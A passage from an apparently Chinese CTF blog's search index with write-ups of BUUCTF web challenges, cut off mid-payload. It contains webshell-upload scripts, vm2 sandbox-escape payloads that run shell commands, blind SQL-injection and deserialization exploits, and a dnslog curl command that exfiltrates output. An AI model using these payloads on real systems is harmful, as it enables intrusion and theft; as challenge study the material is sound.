&lt;script&gt;eval(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 119, 114, 105, 116, 101, 40, 116, 104, 105, 115, 46, 95, 95, 112, 114, 111, 116, 111, 95, 95, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 46, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 40, 39, 114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115, 39, 41, 40, 41, 46, 109, 97, 105, 110, 77, 111, 100, 117, 108, 101, 46, 114, 101, 113, 117, 105, 114, 101, 40, 39, 99, 104, 105, 108, 100, 95, 112, 114, 111, 99, 101, 115, 115, 39, 41, 46, 101, 120, 101, 99, 83, 121, 110, 99, 40, 39, 108, 115, 32, 47, 39, 41, 41))&lt;&#x2F;script&gt; 然后cat /flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"buu刷题记录(二)","slug":"buu刷题记录(二)","date":"2022-01-19T11:00:26.000Z","updated":"2022-03-28T08:21:46.786Z","comments":true,"path":"2022/01/19/buu刷题记录(二)/","link":"","permalink":"https://ethe448.github.io/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/","excerpt":"","text":"[SUCTF 2019]EasyWeb&lt;?php function get_the_flag()&#123; &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125; &#125; $hhh &#x3D; @$_GET[&#39;_&#39;]; if (!$hhh)&#123; highlight_file(__FILE__); &#125; if(strlen($hhh)&gt;18)&#123; die(&#39;One inch long, one inch strong!&#39;); &#125; if ( preg_match(&#39;&#x2F;[\\x00- 0-9A-Za-z\\&#39;&quot;\\&#96;~_&amp;.,|&#x3D;[\\x7F]+&#x2F;i&#39;, $hhh) ) die(&#39;Try something else!&#39;); $character_type &#x3D; count_chars($hhh, 3); if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;); eval($hhh); ?&gt; 前半段是关于文件上传的代码，后半段则是无数字字母rce，猜是要传一个一句话木马上去getshell 但是有个非预期解，利用eval函数查看phpinfo就能找到flag _&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo 预期解： 首先利用eval来执行get_the_flag函数 _&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;;&amp;%ff&#x3D;get_the_flag 再看get_the_flag这个函数 function get_the_flag()&#123; &#x2F;&#x2F; webadmin will remove your upload file every 20 min!!!! $userdir &#x3D; &quot;upload&#x2F;tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES[&quot;file&quot;]))&#123; $tmp_name &#x3D; $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#x2F;&#x2F; 表示的是上传临时文件的绝对路径 $name &#x3D; $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension &#x3D; substr($name, strrpos($name,&quot;.&quot;)+1);&#x2F;&#x2F;得到后缀 if(preg_match(&quot;&#x2F;ph&#x2F;i&quot;,$extension)) die(&quot;^_^&quot;);&#x2F;&#x2F;禁止ph的文件后缀 if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!&#x3D;&#x3D;False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); &#x2F;&#x2F;图片判断 $path&#x3D; $userdir.&quot;&#x2F;&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125; &#125; 对上传的文件内容进行了过滤，过滤了ph，&lt;?，同时还要求上传的文件文件头为图片类型 所以可以尝试上传htaccess格式或者user.ini格式的文件来解析图片马 .user.ini没用，可能是因为上传的文件夹内没有正常的php文件 偷了个脚本 import requests import base64 htaccess &#x3D; b&quot;&quot;&quot; #define width 1337 #define height 1337 AddType application&#x2F;x-httpd-php .sss php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.sss&quot; &quot;&quot;&quot; shell &#x3D; b&quot;GIF89a11&quot; + base64.b64encode(b&quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;) #GIF89后的11是为了满足base64编码 url &#x3D; &quot;http:&#x2F;&#x2F;5da5136e-0e89-4d3c-bac5-a2d4f561663b.node4.buuoj.cn:81&#x2F;?_&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;();&amp;%ff&#x3D;get_the_flag&quot; files &#x3D; &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image&#x2F;jpeg&#39;)&#125; data &#x3D; &#123;&quot;upload&quot;:&quot;Submit&quot;&#125; response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files) print(response.text) files &#x3D; &#123;&#39;file&#39;:(&#39;shell.sss&#39;,shell,&#39;image&#x2F;jpeg&#39;)&#125; response &#x3D; requests.post(url&#x3D;url, data&#x3D;data, files&#x3D;files) print(response.text) 得到路径之后蚁剑连一下 根目录下 ？？为什么我能直接读，百度的wp都是还要绕过open_basedir的 浅谈几种Bypass open_basedir的方法 | 易学教程 (e-learn.cn) bypass open_basedir的新方法 - 先知社区 (aliyun.com) [NPUCTF2020]ezinclude 抓包，把给的hash值利用get传进去 看一下flflflflag.php 利用伪协议读一下源码 file=php://filter/convert.base64-encode/resource=flflflflag.php 得到 &lt;html&gt; &lt;head&gt; &lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt; window.location.href&#x3D;&quot;404.html&quot;; &lt;&#x2F;script&gt; &lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;&gt; &lt;body&gt; &lt;?php $file&#x3D;$_GET[&#39;file&#39;]; if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123; die(&#39;nonono&#39;); &#125; @include($file); echo &#39;include($_GET[&quot;file&quot;])&#39;; ?&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; index.php &lt;?php include &#39;config.php&#39;; @$name&#x3D;$_GET[&#39;name&#39;]; @$pass&#x3D;$_GET[&#39;pass&#39;]; if(md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass)&#123; echo &#39;&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt; window.location.href&#x3D;&quot;flflflflag.php&quot;; &lt;&#x2F;script&gt; &#39;; &#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username&#x2F;password error&quot;; &#125; ?&gt; &lt;html&gt; &lt;!--md5($secret.$name)&#x3D;&#x3D;&#x3D;$pass --&gt; &lt;&#x2F;html&gt; config.php有个假flag。。。 这道题是要利用php临时文件来写马，找到phpinfo里的flag PHP临时文件机制与利用的思考 - linuxsec - 博客园 (cnblogs.com) 关于php文件操作的几个小trick - tr1ple - 博客园 (cnblogs.com) 临时文件的默认存储位置在tmp目录下，扫目录扫出的dir.php显示了tmp目录下的文件 dir.php &lt;?php var_dump(scandir(&#39;&#x2F;tmp&#39;)); ?&gt; 利用python脚本上传文件 import requests from io import BytesIO url&#x3D;&quot;http:&#x2F;&#x2F;77fd686d-4b45-41a8-81f4-0a199419646a.node4.buuoj.cn:81&#x2F;flflflflag.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&#x2F;&#x2F;使php崩溃，让上传的文件保留在tmp目录中 payload&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot; files&#x3D;&#123; &quot;file&quot;:BytesIO(payload.encode()) &#125; r&#x3D;requests.post(url&#x3D;url,files&#x3D;files,allow_redirects&#x3D;False)&#x2F;&#x2F;防止重定向 print(r.text) 可以看到上传成功 得到flag [HFCTF2020]JustEscape 访问一下run.php 刚开始以为是php的代码执行，但是试了试没啥反应 然后发现考点是js的vm2逃逸 先用Error().stack看看（js中捕获异常堆栈信息 然后找一下vm2逃逸的payload Breakout in v3.8.3 · Issue #225 · patriksimek/vm2 (github.com) try &#123; Buffer.from(new Proxy(&#123;&#125;, &#123; getOwnPropertyDescriptor()&#123; throw f&#x3D;&gt;f[&#96;&#96;.concat(&#96;constr&#96;,&#96;uctor&#96;)](&#96;&#96;.concat(&#96;return pro&#96;,&#96;cess&#96;))(); &#125; &#125;)); &#125; catch(e) &#123; e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&#96;&#96;.concat(&#96;child_proc&#96;,&#96;ess&#96;)) [&#96;&#96;.concat(&#96;ex&#96;,&#96;ecSync&#96;)](&#96;cat package.json&#96;) &#125; 或 &#39;(&#39; + function()&#123; TypeError.prototype.get_process &#x3D; f&#x3D;&gt;f.constructor(&quot;return process&quot;)(); try&#123; Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1; &#125;catch(e)&#123; return e.get_process(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString(); &#125; &#125;+&#39;)()&#39;; try&#123; console.log(new VM().run(untrusted)); &#125;catch(x)&#123; console.log(x); &#125; 但是直接利用有waf [&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;] 所以通过在关键字字母上加上 ` 进行绕过 &#x2F;run.php?code&#x3D;(()&#x3D;%3E&#123;%20TypeError[[&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;t&#96;,&#96;o&#96;,&#96;t&#96;,&#96;y&#96;,&#96;p&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)][&#96;a&#96;]%20&#x3D;%20f&#x3D;%3Ef[[&#96;c&#96;,&#96;o&#96;,&#96;n&#96;,&#96;s&#96;,&#96;t&#96;,&#96;r&#96;,&#96;u&#96;,&#96;c&#96;,&#96;t&#96;,&#96;o&#96;,&#96;r&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;r&#96;,&#96;e&#96;,&#96;t&#96;,&#96;u&#96;,&#96;r&#96;,&#96;n&#96;,&#96;%20&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))();%20try&#123;%20Object[&#96;preventExtensions&#96;](Buffer[&#96;from&#96;](&#96;&#96;))[&#96;a&#96;]%20&#x3D;%201;%20&#125;catch(e)&#123;%20return%20e[&#96;a&#96;](()&#x3D;%3E&#123;&#125;)[&#96;mainModule&#96;][[&#96;r&#96;,&#96;e&#96;,&#96;q&#96;,&#96;u&#96;,&#96;i&#96;,&#96;r&#96;,&#96;e&#96;][&#96;join&#96;](&#96;&#96;)]([&#96;c&#96;,&#96;h&#96;,&#96;i&#96;,&#96;l&#96;,&#96;d&#96;,&#96;_&#96;,&#96;p&#96;,&#96;r&#96;,&#96;o&#96;,&#96;c&#96;,&#96;e&#96;,&#96;s&#96;,&#96;s&#96;][&#96;join&#96;](&#96;&#96;))[[&#96;e&#96;,&#96;x&#96;,&#96;e&#96;,&#96;c&#96;,&#96;S&#96;,&#96;y&#96;,&#96;n&#96;,&#96;c&#96;][&#96;join&#96;](&#96;&#96;)](&#96;cat+%2fflag&#96;)[&#96;toString&#96;]();%20&#125;%20&#125;)() join的作用： 还有另一种绕过方式 &#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96; 把所有被过滤的字符按这个方式改写就行 (function ()&#123; TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)(); try&#123; Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1; &#125;catch(e)&#123; return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;cat &#x2F;flag&#96;).toString(); &#125; &#125;)() [网鼎杯2018]Unfinish进入之后是login.php界面，有login那肯定也有register.php，访问一下然后注册个用户，再登录 整个页面除了这个用户名其他没有任何有用的地方，于是猜测是二次注入 information，逗号都被过滤了 只能用from for代替逗号，之间猜表名是flag 确定之后写脚本跑flag import re from time import sleep import requests flag &#x3D; &#39;&#39; url &#x3D; &#39;http:&#x2F;&#x2F;a5568bf9-7958-451d-8e61-3e7dc9fa8556.node4.buuoj.cn:81&#x2F;&#39; payload &#x3D; &#39;0+ascii(substr((select * from flag) from &#123;&#125; for 1))&#39; for i in range(1000): sleep(0.3) data &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot;: &quot;0&#39;+ascii(substr((select * from flag) from &#123;&#125; for 1))--+&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125; data1 &#x3D; &#123;&quot;email&quot;: &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot;: &quot;123&quot;&#125; requests.post(url&#x3D;url + &#39;register.php&#39;, data&#x3D;data) r2 &#x3D; requests.post(url&#x3D;url + &#39;login.php&#39;, data&#x3D;data1) res &#x3D; re.search(r&#39;&lt;span class&#x3D;&quot;user-name&quot;&gt;\\s*(\\d*)\\s*&lt;&#x2F;span&gt;&#39;, r2.text) res1 &#x3D; re.search(r&#39;\\d+&#39;, res.group()) flag &#x3D; flag + chr(int(res1.group())) print(flag) [GXYCTF2019]StrongestMind写脚本执行运算就行 import re import requests from time import sleep # url &#x3D; &#39;http:&#x2F;&#x2F;e7e29bd6-320e-4016-b8be-63f714c813ec.node4.buuoj.cn:81&#x2F;index.php&#39; req &#x3D; requests.session() response &#x3D; req.get(url) for i in range(1001): math &#x3D; re.search(r&#39;[0-9]+ [+|-] [0-9]+&#39;, response.text) data &#x3D; &#123;&quot;answer&quot; : eval(math.group())&#125; response &#x3D; req.post(url, data&#x3D;data) print(i,data) response.encoding &#x3D; &quot;utf-8&quot; print(response.text) sleep(0.1) 唯一要注意的就是要先用request.session()保持会话 [MRCTF2020]Ezauditphp的伪随机，和前边一道题很像 看到www.zip，下载下来看看源码 if(isset($_POST[&#39;login&#39;]))&#123; $username &#x3D; $_POST[&#39;username&#39;]; $password &#x3D; $_POST[&#39;password&#39;]; $Private_key &#x3D; $_POST[&#39;Private_key&#39;]; if (($username &#x3D;&#x3D; &#39;&#39;) || ($password &#x3D;&#x3D; &#39;&#39;) ||($Private_key &#x3D;&#x3D; &#39;&#39;)) &#123; &#x2F;&#x2F; 若为空,视为未填写,提示错误,并3秒后返回登录界面 header(&#39;refresh:2; url&#x3D;login.html&#39;); echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else if($Private_key !&#x3D; &#39;*************&#39; ) &#123; header(&#39;refresh:2; url&#x3D;login.html&#39;); echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else&#123; if($Private_key &#x3D;&#x3D;&#x3D; &#39;************&#39;)&#123; $getuser &#x3D; &quot;SELECT flag FROM user WHERE username&#x3D; &#39;crispr&#39; AND password &#x3D; &#39;$password&#39;&quot;.&#39;;&#39;; $link&#x3D;mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;test&quot;,$link); $result &#x3D; mysql_query($getuser); while($row&#x3D;mysql_fetch_assoc($result))&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;&#x2F;td&gt;&lt;td&gt;&quot;; &#125; &#125; &#125; &#125; &#x2F;&#x2F; genarate public_key function public_key($length &#x3D; 16) &#123; $strings1 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;; $public_key &#x3D; &#39;&#39;; for ( $i &#x3D; 0; $i &lt; $length; $i++ ) $public_key .&#x3D; substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; &#x2F;&#x2F;genarate private_key function private_key($length &#x3D; 12) &#123; $strings2 &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;; $private_key &#x3D; &#39;&#39;; for ( $i &#x3D; 0; $i &lt; $length; $i++ ) $private_key .&#x3D; substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key &#x3D; public_key(); &#x2F;&#x2F;$Public_key &#x3D; KVQP0LdJKRaV3n9D how to get crispr&#39;s private_key??? 给了一个公钥，我们来试试求私钥 两个脚本用那个都行，把输出的结果放到php_mt_seed里求求种子 得到种子之后就能得到私钥的值了 对于密码这部分可以直接用万能密码 登录拿到flag [网鼎杯]track_hacker不是buu的题，也没啥难度，就是记录一下这种解码的方式 用python2解码 如果用python3要用这种写法 duangShell主要是记录一下利用dnslog外带的方法 &lt;!DOCTYPE html&gt; &lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt; &lt;title&gt;give me a girl&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;?php error_reporting(0); echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;; if (!isset($_POST[&#39;girl_friend&#39;])) &#123; die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;); &#125; else &#123; $girl &#x3D; $_POST[&#39;girl_friend&#39;]; if (preg_match(&#39;&#x2F;\\&gt;|\\\\\\&#x2F;&#39;, $girl)) &#123; die(&#39;just girl&#39;); &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$&#x2F;i&#39;, $girl)) &#123; echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;; &#125; else &#123; &#x2F;&#x2F;duangShell~~~~ exec($girl); &#125; &#125; 可以看到post的girl_friend值绕过过滤之后直接命令执行，但是这里是exec不存在回显，所以可以进行反弹shell，或者利用dnslog外带命令 http://ceye.io/ curl http:&#x2F;&#x2F;xxx.ceye.io&#x2F;&#96;反引号内执行命令&#96; 既然能执行命令，那我们就可以用find找flag文件名然后查看，或者直接grep找内容，但是如果从根目录开始找buu的靶机好像跑不动，会显示超时 或者用grep直接带出flag 注意的是这种外带一次只能显示一条数据，所以可能会匹配到其他的文件，如果想查看其他数据，就要利用sed命令 [GYCTF2020]Easyphp在update界面，即使没有成功登录也会继续执行下面的调用update方法的语句 重点在lib.php中，这里面有两个__destruct方法，我们要利用的是UpdateHelper类中的__destruct,这是我们反序列化的起点 但是我们先来看看dbCtrl类 class dbCtrl &#123; public $hostname&#x3D;&quot;127.0.0.1&quot;; public $dbuser&#x3D;&quot;root&quot;; public $dbpass&#x3D;&quot;root&quot;; public $database&#x3D;&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name&#x3D;$_POST[&#39;username&#39;]; $this-&gt;password&#x3D;$_POST[&#39;password&#39;]; $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;]; &#125; public function login($sql) &#123; $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#39;用户不存在!&#39;); return false; &#125; if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123; echo(&#39;密码错误！&#39;); return false; &#125; $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; &#x2F;&#x2F;还没来得及写 &#125; &#125; 能看出数据库中是存在admin用户的，但是密码我们不知道，这里的sql查询语句为select id,password from user where username=?如果能控制这里的sql执行语句为select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?便可经过登陆的密码验证，这个操作是可以实现的c4ca4238a0b923820dcc509a6f75849b是1的MD5值数据库 这是sql创造临时列的一种方法，如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，第一列是数据库中的数据，第二列是添加的临时列1 class User &#123; public $id; public $age&#x3D;null; public $nickname&#x3D;null; public function login() &#123; if(isset($_POST[&#39;username&#39;])&amp;&amp;isset($_POST[&#39;password&#39;]))&#123; $mysqli&#x3D;new dbCtrl(); $this-&gt;id&#x3D;$mysqli-&gt;login(&#39;select id,password from user where username&#x3D;?&#39;); if($this-&gt;id)&#123; $_SESSION[&#39;id&#39;]&#x3D;$this-&gt;id; $_SESSION[&#39;login&#39;]&#x3D;1; echo &quot;你的ID是&quot;.$_SESSION[&#39;id&#39;]; echo &quot;你好！&quot;.$_SESSION[&#39;token&#39;]; echo &quot;&lt;script&gt;window.location.href&#x3D;&#39;.&#x2F;update.php&#39;&lt;&#x2F;script&gt;&quot;; return $this-&gt;id; &#125; &#125; &#125; public function update()&#123; $Info&#x3D;unserialize($this-&gt;getNewinfo()); $age&#x3D;$Info-&gt;age; $nickname&#x3D;$Info-&gt;nickname; $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]); &#x2F;&#x2F;这个功能还没有写完 先占坑 &#125; public function getNewInfo()&#123; $age&#x3D;$_POST[&#39;age&#39;]; $nickname&#x3D;$_POST[&#39;nickname&#39;]; return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);&#x2F;&#x2F;危 &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age);&#x2F;&#x2F;这里如果我们将nickname实例化为info类的对象，那么tostring执行的时候就相当于调用一个info类中不存在的方法，也就会调用info类中的__call方法 return &quot;0-0&quot;; &#125; &#125; class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age&#x3D;$age; $this-&gt;nickname&#x3D;$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#x2F;&#x2F;call方法的两个参数分别是方法名和方法参数，也就是说这个argument就是user类的age属性，是我们可以控制的。然后我们将CtrlCase实例化为dbCtrl类的对象，就能调用dbCtrl类的login方法，再通过控制user类的age，实现对sql语句的控制 &#125; &#125; Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo&#x3D;unserialize($newInfo); $upDate&#x3D;new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql;&#x2F;&#x2F;将sql实例化为User类的对象，在该类被结束销毁时调用User::__toString方法函数 &#125; &#125; class dbCtrl &#123; public $hostname&#x3D;&quot;127.0.0.1&quot;; public $dbuser&#x3D;&quot;root&quot;; public $dbpass&#x3D;&quot;root&quot;; public $database&#x3D;&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name&#x3D;$_POST[&#39;username&#39;]; $this-&gt;password&#x3D;$_POST[&#39;password&#39;]; $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;]; &#125; public function login($sql) &#123; $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#39;用户不存在!&#39;); return false; &#125; if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123; echo(&#39;密码错误！&#39;); return false; &#125; $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; &#x2F;&#x2F;还没来得及写 &#125; &#125; 所以pop链为UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login($sql) 反序列化脚本为 &lt;?php class User &#123; public $age&#x3D; &#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&#39; ; public $nickname; public function __construct() &#123; $this -&gt; nickname &#x3D; new Info(); &#125; public function __toString(): string &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; &#125; &#125; class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct()&#123; $this-&gt;CtrlCase &#x3D; new dbCtrl(); &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125; &#125; Class UpdateHelper&#123; public $sql; public function __construct()&#123; $this -&gt;sql &#x3D; new User(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125; &#125; class dbCtrl &#123; public function __construct() &#123; $this-&gt;name&#x3D;&#39;admin&#39;; $this-&gt;password&#x3D;&#39;1&#39;; &#125; public function login($sql) &#123; &#125; &#125; $a &#x3D; new UpdateHelper(); echo serialize($a); &#x2F;&#x2F;&#x2F;&#x2F;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125; 正常情况下的序列化内容 我们要把我们的序列化结果插入到2的位置 可以看到插入后他只能被作为nickname的值，所以我们就要利用反序列化的字符逃逸，利用safe函数中将union替换为六个字母的hacker实现逃逸，两个箭头之内的值的数量就是我们要添加的union的值 payload: age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionu